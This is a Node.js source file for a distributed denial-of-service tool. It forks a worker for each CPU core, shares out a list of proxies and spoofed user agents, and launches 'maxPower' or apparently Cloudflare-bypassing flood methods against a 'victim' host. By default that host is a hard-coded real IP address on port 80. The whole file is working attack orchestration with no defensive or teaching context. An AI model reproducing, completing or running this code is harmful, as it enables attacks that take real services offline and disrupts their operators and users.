const net = require('net');
const fs = require('fs');
const config = require('./config.json');

const cluster = require('cluster');

if (cluster.isMaster) {
    let cpuCount = require('os').cpus().length;

    let proxy = fs.readFileSync('proxy.txt').toString().split('\r\n');
    let proxyCount = proxy.length;

    for (let i = 0; i < cpuCount; i += 1) {
        let worker = cluster.fork();
        worker.send({ id: worker.id, proxy: proxy.splice(0, proxyCount / cpuCount) });
    }

    cluster.on('exit', function (worker) {
        console.log('Worker %d died :(', worker.id);
        cluster.fork();
    });
} else {

    let workerId = null;
    let proxy = [];
    const userAgents = fs.readFileSync('useragents.txt').toString().split('\r\n');

    const maxPower = require('./maxPower');
    const cf = require('./cf');

    class Ddos {

        constructor() {
            this.stats = {
                errors: 0,
                success: 0,
                loop: 0
            };
            this.checkInterval = setInterval(() => {
                console.log(`Worker: ${workerId} Loop: ${this.stats.loop} Current stats: errors(${this.stats.errors}) success(${this.stats.success})`);
            }, 1000);
            this.isRunning = false;

            this.maxPower = new maxPower(userAgents, stats => {
                this.stats.errors += stats.errors;
                this.stats.success += stats.success;
            });
            this.cf = new cf(userAgents, stats => {
                this.stats.errors += stats.errors;
                this.stats.success += stats.success;
            });
        }

        run(props) {
            this.isRunning = true;

            if (props.method === 'maxPower')
                for (let i = 0; i < props.threads; i++)
                    this.maxPower.start(props);
            else if (props.method === 'cloudflare')
                this.cf.start(props);
        }

        stop() {
            this.maxPower.stop();
            this.cf.stop();
            clearInterval(this.checkInterval);
        }

    }

    const ddos = new Ddos();

    process.on('message', data => {
        workerId = data.id;
        proxy = data.proxy;
        const victim = {host: process.argv[2] || '5.135.179.221', port: process.argv[3] || 80};

        proxy.forEach(async p => {
            let _proxy = p.split(':');
            console.log('Starting ddos from', _proxy[0], _proxy[1]);
            ddos.run({
                victim: victim,
                proxy: {host: _proxy[0], port: _proxy[1]},
                method: process.argv[6] || 'maxPower',
                threads: process.argv[4] || 10,
                requests: process.argv[5] || 100
            });
        });
    });
}